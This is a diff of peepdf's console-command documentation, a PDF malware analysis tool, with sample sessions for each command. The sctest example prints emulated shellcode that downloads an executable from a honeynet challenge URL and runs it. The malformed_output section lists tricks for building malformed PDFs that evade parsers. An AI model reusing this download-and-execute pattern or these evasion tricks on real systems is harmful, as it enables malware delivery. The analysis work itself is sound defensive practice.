@@ -1,49 +1,54 @@
 #summary Documentation of the console commands to use all the functionalities of the tool.
-#labels Phase-Support
+#labels Phase-Support,Featured
 
 = Console commands =
 <br/>
 There are a lot of commands that can be used in the interactive console of peepdf and here there is an explanation of all of them:
-  * [#bytes bytes]
+===Showing information===
   * [#changelog changelog]
+  * [#errors errors]
+  * [#bytes bytes]
+  * [#info info]
+  * [#metadata metadata]
+  * [#object object]
+  * [#offsets offsets]
+  * [#rawobject rawobject]
+  * [#rawstream rawstream]
+  * [#references references]
+  * [#stream stream]
+  * [#tree tree]
+  * [#save_version save_version]
+===Creation/Modification===
   * [#create create]
   * [#decode decode]
   * [#embed embed]
   * [#encode encode]
   * [#encode_strings encode_strings]
   * [#encrypt encrypt]
-  * [#errors errors]
-  * [#exit exit]
   * [#filters filters]
-  * [#help help]
-  * [#info info]
+  * [#malformed_output malformed_output]
+  * [#modify modify]
+  * [#save save]
+===Javascript analysis===
   * [#js js]
   * [#js_analyse js_analyse]
   * [#js_code js_code]
   * [#js_join js_join]
   * [#js_unescape js_unescape]
-  * [#log log]
-  * [#malformed_output malformed_output]
-  * [#metadata metadata]
-  * [#modify modify]
-  * [#object object]
-  * [#offsets offsets]
-  * [#open open]
-  * [#quit quit]
-  * [#rawobject rawobject]
-  * [#rawstream rawstream]
-  * [#references references]
-  * [#replace replace]
-  * [#reset reset]
-  * [#save save]
-  * [#save_version save_version]
+===Shellcode analysis===
   * [#sctest sctest]
+===Misc===
+  * [#replace replace]
   * [#search search]
   * [#set set]
   * [#show show]
-  * [#stream stream]
-  * [#tree tree]
-
+===Console===
+  * [#exit exit]
+  * [#help help]
+  * [#log log]
+  * [#open open]
+  * [#quit quit]
+  * [#reset reset]
 <br/>
 ===bytes===
 {{{
@@ -68,7 +73,7 @@ endobj
 /Kids [ 3 0 R ]
 /C
 }}}
-</br>
+<br/>
 ===changelog===
 {{{
 Usage: changelog [version]
@@ -243,7 +248,8 @@ Shows the errors of the file or object (object_id, xref, trailer)
 {{{
 PPDF> errors
 
-No closing delimiter found (1) 
+Bad object for /XObject key (1) 
+No entries in xref section (1) 
 }}}
 <br/>
 ===exit===
@@ -512,4 +518,761 @@ if (bBeUHg == 1){NTLv7BP = 0x30303030;}
 ===================================================================
 }}}
 <br/>
-===Updating this documentation, please, be patient ;)===
+===js_join===
+{{{
+Usage: js_join variable var_name
+Usage: js_join file file_name
+
+Joins some strings separated by quotes and stored in the specified variable or file in a unique one
+
+Example:
+
+aux = "%u65"+"54"+"%u74"+"73"
+
+> js_join variable aux
+
+%u6554%u7473
+}}}
+<br/>
+===js_unescape===
+{{{
+Usage: js_unescape variable var_name
+Usage: js_unescape file file_name
+
+Unescapes the escaped characters stored in the specified variable or file
+
+Example:
+
+aux = "%u6554%u7473"
+
+> js_unescape variable aux
+
+54 65 73 74                                       |Test|
+}}}
+<br/>
+===log===
+{{{
+Usage: log
+
+Show the actual state of logging
+
+Usage: log stop
+
+Stop logging
+
+Usage: log log_file
+
+Starts logging in the specified file
+}}}
+<br/>
+===malformed_output===
+{{{
+Usage: malformed_output [option1 [option2 ...] [header_file]]
+
+Enable malformed output when saving the file:
+
+	0: Removes all the malformed options.
+	1 [header_file]: Enable all the implemented tricks. Default option.
+	2 [header_file]: Puts the default or specified header before the PDF header.
+	3: Removes all the "endobj" tags.
+	4: Removes all the "endstream" tags.
+	5: Removes the "xref" section.
+	6: Bad header: %PDF-1
+}}}
+<br/>
+===metadata===
+{{{
+Usage: metadata [version]
+
+Show the metadata of the document or version of the document
+}}}
+{{{
+PPDF> metadata
+
+Info Object in version 0:
+
+<< /Title 
+/ModDate 2008312053854
+/CreationDate 2008312053854
+/Producer Scribus PDF Library 1.3.3.12
+/Trapped /False
+/Creator Scribus 1.3.3.12
+/Keywords 
+/Author  >>
+}}}
+<br/>
+===modify===
+{{{
+Usage: modify object|stream id [version] [file]
+
+Modify the object or stream specified. It's possible to use a file to retrieve the stream content 
+(ONLY for stream content).
+}}}
+{{{
+PPDF> object 4
+
+<< /Kids [ 9 0 R ]
+/Count 1
+/Resources 8 0 R
+/Type /Pages >>
+
+PPDF> modify object 4
+
+Key: /Kids
+Raw value: [ 9 0 R ]
+
+Do you want to modify, delete or make no action? (m/d/n) n
+
+Key: /Count
+Raw value: 1
+Value: 1
+
+Do you want to modify, delete or make no action? (m/d/n) m
+
+Raw value: 1
+
+Do you want to modify, delete or make no action? (m/d/n) m
+
+Please, specify the number object content:
+
+18
+
+Key: /Resources
+Raw value: 8 0 R
+
+Do you want to modify, delete or make no action? (m/d/n) m
+
+Raw value: 8 0 R
+
+Do you want to modify, delete or make no action? (m/d/n) m
+
+Please, specify the reference object content:
+
+1 0 R
+
+Key: /Type
+Raw value: /Pages
+
+Do you want to modify, delete or make no action? (m/d/n) n
+
+Do you want to add more entries? (y/n) n
+
+Object modified successfully!!
+
+PPDF> object 4
+
+<< /Kids [ 9 0 R ]
+/Count 18
+/Resources 1 0 R
+/Type /Pages >>
+}}}
+<br/>
+===object===
+{{{
+Usage: object object_id [version]
+
+Shows the content of the object after being decoded and decrypted.
+}}}
+{{{
+PPDF> object 1 0
+
+<< /AcroForm 5 0 R
+/Threads 2 0 R
+/Names 7 0 R
+/OpenAction << /S /JavaScript
+/JS this.uSQXcfcd2() >>
+/Pages 4 0 R
+/Outlines 3 0 R
+/Type /Catalog
+/PageLayout /SinglePage
+/Dests 6 0 R
+/ViewerPreferences << /PageDirection /L2R >> >>
+}}}
+<br/>
+===offsets===
+{{{
+Usage: offsets [num_version]
+
+Shows the physical map of the file or the specified version of the document
+}}}
+The output of this command shows in a visual way the physical structure of the document. We can see
+the starting and ending offsets and the size of the elements (in brackets).
+{{{
+PPDF> offsets
+
+       0 Header
+      17
+        Object  1 (260)
+     276
+     279
+        Object  2 (19)
+     297
+     300
+        Object  3 (48)
+     347
+     350
+        Object  4 (77)
+     426
+     430
+        Object  5 (33)
+     462
+     465
+        Object  6 (21)
+     485
+     488
+        Object  7 (41)
+     528
+     531
+        Object  8 (68)
+     598
+     601
+        Object  9 (187)
+     787
+     790
+        Object  10 (52)
+     841
+     844
+        Object  11 (85)
+     928
+     931
+        Object  12 (50)
+     980
+     983
+        Object  13 (5903)
+    6885
+    6887
+        Object  14 (204)
+    7090
+    7093
+        Xref Section (325)
+    7417
+    7420
+        Trailer (69)
+    7488
+    7489 EOF
+}}}
+<br/>
+===open===
+{{{
+Usage: open [-fl] filename
+
+Open and parse the specified file
+
+Options:
+	-f: Sets force parsing mode to ignore errors
+	-l: Sets loose parsing mode for problematic files
+}}}
+<br/>
+===quit===
+{{{
+Usage: quit
+
+Exits from the console
+}}}
+<br/>
+===rawobject===
+{{{
+Usage: rawobject [object_id|xref|trailer [version]]
+
+Show the content of the object without being decoded or decrypted (object_id, xref, trailer)
+}}}
+{{{
+PPDF> rawobject xref
+
+xref
+0 15
+0000000000 65535 f 
+0000000015 00000 n 
+0000000261 00000 n 
+0000000279 00000 n 
+0000000324 00000 n 
+0000000397 00000 n 
+0000000428 00000 n 
+0000000448 00000 n 
+0000000487 00000 n 
+0000000553 00000 n 
+0000000731 00000 n 
+0000000781 00000 n 
+0000000862 00000 n 
+0000000909 00000 n 
+0000004186 00000 n 
+}}}
+{{{
+PPDF> rawobject trailer
+
+trailer
+<< /Size 15
+/Info 14 0 R
+/Root 1 0 R >>
+startxref
+4374
+%%EOF
+}}}
+{{{
+PPDF> rawobject 4
+
+<< /Kids [ 9 0 R ]
+/Count 18
+/Resources 1 0 R
+/Type /Pages >>
+}}}
+<br/>
+===rawstream===
+{{{
+Usage: rawstream object_id [version]
+
+Shows the stream content of the specified document version before being decoded and decrypted
+}}}
+{{{
+PPDF> rawstream 1
+
+78 9c 45 8e c1 0a 83 30 10 44 ef f9 8a f9 83 4d   |x.E....0.D.....M|
+5a 15 0b 22 b4 de 2c a5 a2 bd 15 0f c1 06 09 14   |Z.."..,.........|
+23 1a 4b fb f7 5d 6b a0 2c 7b d8 61 e6 ed 28 48   |#.K..]k.,{.a..(H|
+ec 10 2b ec 71 88 10 41 25 29 b2 0c 74 fb 8c 06   |..+.q..A%)..t...|
+54 68 af 9f ae 17 54 e9 de cc 6c 94 a8 05 5d 47   |Th....T...l...]G|
+33 1c 3b 6f dd c0 01 56 90 e7 6b e4 6c 1f 33 ee   |3.;o...V..k.l.3.|
+0c 5a a5 56 04 c4 2f 29 a8 70 cb e0 a1 82 b5 d2   |.Z.V../).p......|
+93 e1 33 f0 fe 46 41 b5 99 dd 32 75 fc 8c 7d 79   |..3..FA...2u..}y|
+2e e8 62 1e 56 9f dc 9b c9 92 27 91 12 29 6f 1b   |..b.V.....'..)o.|
+48 5b 76 6b 23 a8 01 95 fa a5 9b 6e b2 a3 17 54   |H[vk#......n...T|
+36 88 43 c1 2f a0 0d 3e 09 0a                     |6.C./..>..|
+
+PPDF> stream 1
+
+1 0 2 51 3 94 4 168 << /Type /Catalog
+/Pages 2 0 R
+/OpenAction 4 0 R >><< /Kids [ 3 0 R ]
+/Type /Pages
+/Count 1 >><< /Parent 2 0 R
+/Type /Page
+/Resources << >>
+/MediaBox [ 0 0 600 800 ] >><< /Type /Action
+/S /JavaScript
+/JS 5 0 R >>
+}}}
+<br/>
+===references===
+{{{
+Usage: references to|in object_id [version]
+
+Shows the references in the object or to the object in the specified version of the document
+}}}
+{{{
+PPDF> references in 2
+
+['3 0 R']
+
+PPDF> object 2
+
+<< /Kids [ 3 0 R ]
+/Type /Pages
+/Count 1 >>
+}}}
+{{{
+PPDF> references to 2
+
+[1, 3]
+
+PPDF> object 3
+
+<< /Parent 2 0 R
+/Type /Page
+/Resources << >>
+/MediaBox [ 0 0 600 800 ] >>
+}}}
+<br/>
+===replace===
+{{{
+Usage: replace  all string1 string2
+
+Replace 'string1' with 'string2' in the whole PDF file
+
+Usage: replace variable var_name string1 string2
+Usage: replace file file_name string1 string2
+
+Replace 'string1' with 'string2' in the content of the specified variable or file
+}}}
+{{{
+PPDF> object 2
+
+<< /Kids [ 3 0 R ]
+/Type /Pages
+/Count 1 >>
+
+PPDF> object 3
+
+<< /Parent 2 0 R
+/Type /Page
+/Resources << >>
+/MediaBox [ 0 0 600 800 ] >>
+
+PPDF> replace all Page OtherWord
+
+The string has been replaced correctly
+
+PPDF> object 2
+
+<< /Kids [ 3 0 R ]
+/Type /OtherWords
+/Count 1 >>
+
+PPDF> object 3
+
+<< /Parent 2 0 R
+/Type /OtherWord
+/Resources << >>
+/MediaBox [ 0 0 600 800 ] >>
+}}}
+{{{
+PPDF> set myvar "Hello World"
+PPDF> replace variable myvar Hello Bye
+
+The string has been replaced correctly
+
+PPDF> show myvar
+
+Bye World
+}}}
+<br/>
+===reset===
+{{{
+Usage: reset
+
+Cleans the console
+
+Usage: reset var_name
+
+Resets the variable value to the default value if applicable
+}}}
+It's specially useful when we change the standard ouput of the console to a file or variable to
+restore it to the normal output. See [#set set] command.
+{{{
+PPDF> reset output
+
+output = "stdout"
+}}}
+<br/>
+===save===
+{{{
+Usage: save [filename]
+
+Saves the file to disk
+}}}
+It's recommended to use this command when we make modifications in the document to keep it free of
+conflicts. For example, if we don't save the changes we can have inconsistent results when we use
+"object" and "rawobject" commands, because one of them is related to the file before the modifications
+and the other one after them.
+<br/>
+===save_version===
+{{{
+Usage: save_version num_version filename
+
+Saves the selected file version to disk
+}}}
+<br/>
+===sctest===
+{{{
+Usage: sctest variable var_name
+Usage: sctest file file_name
+Usage: sctest raw offset num_bytes
+
+Wrapper of the sctest tool (libemu) to emulate shellcodes
+}}}
+If the _sctest_ executable is not in the _peepdf_ directory it's necessary to specify the path with
+the [#set set] command. 
+{{{
+PPDF> set sctest /opt/libemu/bin/sctest
+PPDF> set sctestctest file /tmp/shellcode
+
+verbose = 0
+Hook me Captain Cook!
+userhooks.c:127 user_hook_ExitThread
+ExitThread(32)
+stepcount 9172
+FARPROC WINAPI GetProcAddress (
+     HMODULE hModule = 0x7c800000 => 
+         none;
+     LPCSTR lpProcName = 0x0041767d => 
+           = "GetSystemDirectoryA";
+) = 0x7c814eea;
+FARPROC WINAPI GetProcAddress (
+     HMODULE hModule = 0x7c800000 => 
+         none;
+     LPCSTR lpProcName = 0x00417691 => 
+           = "WinExec";
+) = 0x7c86136d;
+FARPROC WINAPI GetProcAddress (
+     HMODULE hModule = 0x7c800000 => 
+         none;
+     LPCSTR lpProcName = 0x00417699 => 
+           = "ExitThread";
+) = 0x7c80c058;
+FARPROC WINAPI GetProcAddress (
+     HMODULE hModule = 0x7c800000 => 
+         none;
+     LPCSTR lpProcName = 0x004176a4 => 
+           = "LoadLibraryA";
+) = 0x7c801d77;
+HMODULE LoadLibraryA (
+     LPCTSTR lpFileName = 0x004176b1 => 
+           = "urlmon";
+) = 0x7df20000;
+FARPROC WINAPI GetProcAddress (
+     HMODULE hModule = 0x7df20000 => 
+         none;
+     LPCSTR lpProcName = 0x004176b8 => 
+           = "URLDownloadToFileA";
+) = 0x7df7b0bb;
+UINT GetSystemDirectory (
+     LPTSTR lpBuffer = 0x0012fe7c => 
+         none;
+     UINT uSize = 32;
+) =  19;
+HRESULT URLDownloadToFile (
+     LPUNKNOWN pCaller = 0x00000000 => 
+         none;
+     LPCTSTR szURL = 0x004176cb => 
+           = "http://blog.honeynet.org.my/forensic_challenge/the_real_malware.exe";
+     LPCTSTR szFileName = 0x0012fe7c => 
+           = "c:\WINDOWS\system32\a.exe";
+     DWORD dwReserved = 0;
+     LPBINDSTATUSCALLBACK lpfnCB = 0;
+) =  0;
+UINT WINAPI WinExec (
+     LPCSTR lpCmdLine = 0x0012fe7c => 
+           = "c:\WINDOWS\system32\a.exe";
+     UINT uCmdShow = 0;
+) =  32;
+void ExitThread (
+     DWORD dwExitCode = 32;
+) =  0;
+
+}}}
+<br/>
+===search===
+{{{
+Usage: search [hex] string
+
+Search the specified string or hexadecimal string in the objects (decoded and encrypted streams included)
+
+Example: search hex \x34\x35
+}}}
+{{{
+PPDF> search javascript
+
+[4]
+}}}
+{{{
+PPDF> search hex \x4a\x61\x76\x61
+
+[4]
+}}}
+<br/>
+===set===
+{{{
+Usage: set [var_name var_value]
+
+Sets the specified variable value or creates one with this value. Without parameters all the variables are shown.
+
+Special variables:
+
+	header_file: READ ONLY. Specifies the file header to be used when 'malformed_options' are active.
+
+	malformed_options: READ ONLY. Variable to store the malformed options used to save the file.
+
+	output: specifies the destination of the commands output. Valid values are: 'stdout', 'variable' and 'file'.
+
+	output_limit: variable to specify the maximum number of lines to be shown at once when the output is long. 
+By default there is no limit.
+
+	sctest: path of the sctest binary. If not specified the working directory will be the default path.
+
+	Usage for the 'output' variable:
+
+	> set output stdout
+	Normal console output
+
+	> set output file file_name
+	Stores the results of the commands in the specified file
+
+	> set output variable var_name
+	Stores the results of the commands in the specified variable
+}}}
+Thanks to this command it's possible to store the result of the rest of commands or anything we want in a
+variable or in a file. If we modify the default output we should restore it with the [#reset reset] command: 
+{{{
+PPDF> rawstream 5
+
+78 da 05 c1 7b 7f 6a 60 00 00 e0 cf 72 dc 5e 8b   |x...{j`....r.^.|
+5a 26 22 8a 37 62 ea 87 cd ad 8b cb ab 25 e4 54   |Z&".7b.......%.T|
+a7 da fa 77 9f fd 3c cf 92 bd 3f 18 bd 89 47 50   |...w..<...?...GP|
+69 69 d2 81 34 6b 3b f5 c2 17 cc d3 6b bb 90 f8   |ii..4k;.....k...|
+b7 b0 f5 5e 58 48 7c 7f 84 1a 1c b8 ed f9 4e 23   |...^XH|......N#|
+40 2a 68 5e 43 af eb 7b 8e f2 35 cb f0 2a 2b 3f   |@*h^C..{..5..*+?|
+41 95 64 b0 a9 af d8 a1 f0 af 51 eb 39 e3 b7 34   |A.d.......Q.9..4|
+2a 84 9d 41 1c 5f ad 59 82 3b fd e9 4a 35 39 9b   |*..A._.Y.;..J59.|
+db 30 64 3e 92 d4 6c 21 98 e4 0b 2b 31 e7 e8 6e   |.0d>..l!...+1..n|
+21 89 2e f6 d4 96 57 b4 54 1e 26 61 b7 b6 16 93   |!.....W.T.&a....|
+67 68 b8 be 8b 79 f1 fe 82 ee eb e2 99 92 f7 68   |gh...y.........h|
+b0 b4 5c 14 10 dc 38 3f dc f8 d0 ac 60 ff 36 a5   |..\...8?....`.6.|
+d6 d8 e3 b2 61 75 0c 2b 1f a6 b6 17 5a cd ea 3a   |....au.+....Z..:|
+7f ff a3 11 b6 38 e0 29 5c e0 6e 72 a9 73 1b 6d   |....8.)\.nr.s.m|
+2e c7 9c 92 83 a3 48 96 bb 3f cc 64 85 af a8 44   |......H..?.d...D|
+92 ed a6 50 e9 56 fa 4b f5 6f e2 67 e0 43 e6 56   |...P.V.K.o.g.C.V|
+7d d8 58 10 a9 70 a8 e0 3b 25 d1 29 e3 ab 2a 7b   |}.X..p..;%.)..*{|
+f2 2a bd c8 9d c1 51 64 80 d5 8c e0 70 f6 74 0b   |.*....Qd....p.t.|
+bc 73 47 52 c8 e3 3a 2c 66 2f c1 bf 1f 10 27 ea   |.sGR..:,f/....'.|
+ee 31 b2 4c 15 80 51 c5 1e 76 bc 7b 9a 65 c4 7b   |.1.L..Q..v.{.e.{|
+ef a4 20 66 b9 42 43 8e 96 3b 28 9e 45 4b a2 c4   |.. f.BC..;(.EK..|
+a9 21 74 6c 93 15 44 b9 05 5a 63 e7 66 d4 a8 48   |.!tl..D..Zc.f..H|
+2e e7 39 18 c7 c6 58 19 82 0d 16 7c 5f 7b c7 8b   |..9...X....|_{..|
+8a ab 6b 2f e5 eb 24 3c 6c f5 8a d8 ca 68 51 3c   |..k/..$<l....hQ<|
+9e cb 89 f3 3b fb 0f 6c d4 7d d7 0d 0a            |....;..l.}...|
+
+PPDF> set output variable stream5
+PPDF> rawstream 5
+
+78 da 05 c1 7b 7f 6a 60 00 00 e0 cf 72 dc 5e 8b   |x...{j`....r.^.|
+5a 26 22 8a 37 62 ea 87 cd ad 8b cb ab 25 e4 54   |Z&".7b.......%.T|
+a7 da fa 77 9f fd 3c cf 92 bd 3f 18 bd 89 47 50   |...w..<...?...GP|
+69 69 d2 81 34 6b 3b f5 c2 17 cc d3 6b bb 90 f8   |ii..4k;.....k...|
+b7 b0 f5 5e 58 48 7c 7f 84 1a 1c b8 ed f9 4e 23   |...^XH|......N#|
+40 2a 68 5e 43 af eb 7b 8e f2 35 cb f0 2a 2b 3f   |@*h^C..{..5..*+?|
+41 95 64 b0 a9 af d8 a1 f0 af 51 eb 39 e3 b7 34   |A.d.......Q.9..4|
+2a 84 9d 41 1c 5f ad 59 82 3b fd e9 4a 35 39 9b   |*..A._.Y.;..J59.|
+db 30 64 3e 92 d4 6c 21 98 e4 0b 2b 31 e7 e8 6e   |.0d>..l!...+1..n|
+21 89 2e f6 d4 96 57 b4 54 1e 26 61 b7 b6 16 93   |!.....W.T.&a....|
+67 68 b8 be 8b 79 f1 fe 82 ee eb e2 99 92 f7 68   |gh...y.........h|
+b0 b4 5c 14 10 dc 38 3f dc f8 d0 ac 60 ff 36 a5   |..\...8?....`.6.|
+d6 d8 e3 b2 61 75 0c 2b 1f a6 b6 17 5a cd ea 3a   |....au.+....Z..:|
+7f ff a3 11 b6 38 e0 29 5c e0 6e 72 a9 73 1b 6d   |....8.)\.nr.s.m|
+2e c7 9c 92 83 a3 48 96 bb 3f cc 64 85 af a8 44   |......H..?.d...D|
+92 ed a6 50 e9 56 fa 4b f5 6f e2 67 e0 43 e6 56   |...P.V.K.o.g.C.V|
+7d d8 58 10 a9 70 a8 e0 3b 25 d1 29 e3 ab 2a 7b   |}.X..p..;%.)..*{|
+f2 2a bd c8 9d c1 51 64 80 d5 8c e0 70 f6 74 0b   |.*....Qd....p.t.|
+bc 73 47 52 c8 e3 3a 2c 66 2f c1 bf 1f 10 27 ea   |.sGR..:,f/....'.|
+ee 31 b2 4c 15 80 51 c5 1e 76 bc 7b 9a 65 c4 7b   |.1.L..Q..v.{.e.{|
+ef a4 20 66 b9 42 43 8e 96 3b 28 9e 45 4b a2 c4   |.. f.BC..;(.EK..|
+a9 21 74 6c 93 15 44 b9 05 5a 63 e7 66 d4 a8 48   |.!tl..D..Zc.f..H|
+2e e7 39 18 c7 c6 58 19 82 0d 16 7c 5f 7b c7 8b   |..9...X....|_{..|
+8a ab 6b 2f e5 eb 24 3c 6c f5 8a d8 ca 68 51 3c   |..k/..$<l....hQ<|
+9e cb 89 f3 3b fb 0f 6c d4 7d d7 0d 0a            |....;..l.}...|
+
+PPDF> reset output
+
+output = "stdout"
+
+PPDF> show stream5
+
+78 da 05 c1 7b 7f 6a 60 00 00 e0 cf 72 dc 5e 8b   |x...{j`....r.^.|
+5a 26 22 8a 37 62 ea 87 cd ad 8b cb ab 25 e4 54   |Z&".7b.......%.T|
+a7 da fa 77 9f fd 3c cf 92 bd 3f 18 bd 89 47 50   |...w..<...?...GP|
+69 69 d2 81 34 6b 3b f5 c2 17 cc d3 6b bb 90 f8   |ii..4k;.....k...|
+b7 b0 f5 5e 58 48 7c 7f 84 1a 1c b8 ed f9 4e 23   |...^XH|......N#|
+40 2a 68 5e 43 af eb 7b 8e f2 35 cb f0 2a 2b 3f   |@*h^C..{..5..*+?|
+41 95 64 b0 a9 af d8 a1 f0 af 51 eb 39 e3 b7 34   |A.d.......Q.9..4|
+2a 84 9d 41 1c 5f ad 59 82 3b fd e9 4a 35 39 9b   |*..A._.Y.;..J59.|
+db 30 64 3e 92 d4 6c 21 98 e4 0b 2b 31 e7 e8 6e   |.0d>..l!...+1..n|
+21 89 2e f6 d4 96 57 b4 54 1e 26 61 b7 b6 16 93   |!.....W.T.&a....|
+67 68 b8 be 8b 79 f1 fe 82 ee eb e2 99 92 f7 68   |gh...y.........h|
+b0 b4 5c 14 10 dc 38 3f dc f8 d0 ac 60 ff 36 a5   |..\...8?....`.6.|
+d6 d8 e3 b2 61 75 0c 2b 1f a6 b6 17 5a cd ea 3a   |....au.+....Z..:|
+7f ff a3 11 b6 38 e0 29 5c e0 6e 72 a9 73 1b 6d   |....8.)\.nr.s.m|
+2e c7 9c 92 83 a3 48 96 bb 3f cc 64 85 af a8 44   |......H..?.d...D|
+92 ed a6 50 e9 56 fa 4b f5 6f e2 67 e0 43 e6 56   |...P.V.K.o.g.C.V|
+7d d8 58 10 a9 70 a8 e0 3b 25 d1 29 e3 ab 2a 7b   |}.X..p..;%.)..*{|
+f2 2a bd c8 9d c1 51 64 80 d5 8c e0 70 f6 74 0b   |.*....Qd....p.t.|
+bc 73 47 52 c8 e3 3a 2c 66 2f c1 bf 1f 10 27 ea   |.sGR..:,f/....'.|
+ee 31 b2 4c 15 80 51 c5 1e 76 bc 7b 9a 65 c4 7b   |.1.L..Q..v.{.e.{|
+ef a4 20 66 b9 42 43 8e 96 3b 28 9e 45 4b a2 c4   |.. f.BC..;(.EK..|
+a9 21 74 6c 93 15 44 b9 05 5a 63 e7 66 d4 a8 48   |.!tl..D..Zc.f..H|
+2e e7 39 18 c7 c6 58 19 82 0d 16 7c 5f 7b c7 8b   |..9...X....|_{..|
+8a ab 6b 2f e5 eb 24 3c 6c f5 8a d8 ca 68 51 3c   |..k/..$<l....hQ<|
+9e cb 89 f3 3b fb 0f 6c d4 7d d7 0d 0a            |....;..l.}...|
+}}}
+<br/>
+===show===
+{{{
+Usage: show var_name
+
+Shows the value of the specified variable
+
+Special variables:
+
+	header_file
+	malformed_options
+	output
+	output_limit
+	sctest
+}}}
+{{{
+PPDF> set sctest /opt/libemu/bin/sctest
+PPDF> show sctest
+
+/opt/libemu/bin/sctest
+}}}
+<br/>
+===stream===
+{{{
+Usage: stream object_id [version]
+
+Shows the object stream content of the specified version after being decoded and decrypted (if necessary)
+}}}
+{{{
+PPDF> rawstream 1
+
+78 9c 45 8e c1 0a 83 30 10 44 ef f9 8a f9 83 4d   |x.E....0.D.....M|
+5a 15 0b 22 b4 de 2c a5 a2 bd 15 0f c1 06 09 14   |Z.."..,.........|
+23 1a 4b fb f7 5d 6b a0 2c 7b d8 61 e6 ed 28 48   |#.K..]k.,{.a..(H|
+ec 10 2b ec 71 88 10 41 25 29 b2 0c 74 fb 8c 06   |..+.q..A%)..t...|
+54 68 af 9f ae 17 54 e9 de cc 6c 94 a8 05 5d 47   |Th....T...l...]G|
+33 1c 3b 6f dd c0 01 56 90 e7 6b e4 6c 1f 33 ee   |3.;o...V..k.l.3.|
+0c 5a a5 56 04 c4 2f 29 a8 70 cb e0 a1 82 b5 d2   |.Z.V../).p......|
+93 e1 33 f0 fe 46 41 b5 99 dd 32 75 fc 8c 7d 79   |..3..FA...2u..}y|
+2e e8 62 1e 56 9f dc 9b c9 92 27 91 12 29 6f 1b   |..b.V.....'..)o.|
+48 5b 76 6b 23 a8 01 95 fa a5 9b 6e b2 a3 17 54   |H[vk#......n...T|
+36 88 43 c1 2f a0 0d 3e 09 0a                     |6.C./..>..|
+
+PPDF> stream 1
+
+1 0 2 51 3 94 4 168 << /Type /Catalog
+/Pages 2 0 R
+/OpenAction 4 0 R >><< /Kids [ 3 0 R ]
+/Type /Pages
+/Count 1 >><< /Parent 2 0 R
+/Type /Page
+/Resources << >>
+/MediaBox [ 0 0 600 800 ] >><< /Type /Action
+/S /JavaScript
+/JS 5 0 R >>
+}}}
+<br/>
+===tree===
+{{{
+Usage: tree [num_version]
+
+Shows the tree graph of the file or specified version
+}}}
+It's useful to see all the dependencies between objects in a visual way, the output is the logical structure of the document.
+{{{
+PPDF> tree
+
+/Catalog (1)
+	/Fields (5)
+	array (2)
+	/JavaScript (7)
+		/Names (10)
+			/Action /JavaScript (12)
+				string (13)
+	/Pages (4)
+		/Page (9)
+			/Pages (4)
+			stream (11)
+			/ProcSet (8)
+		/ProcSet (8)
+	/Outlines (3)
+	dictionary (6)
+/Info (14)
+}}}
+<br/>
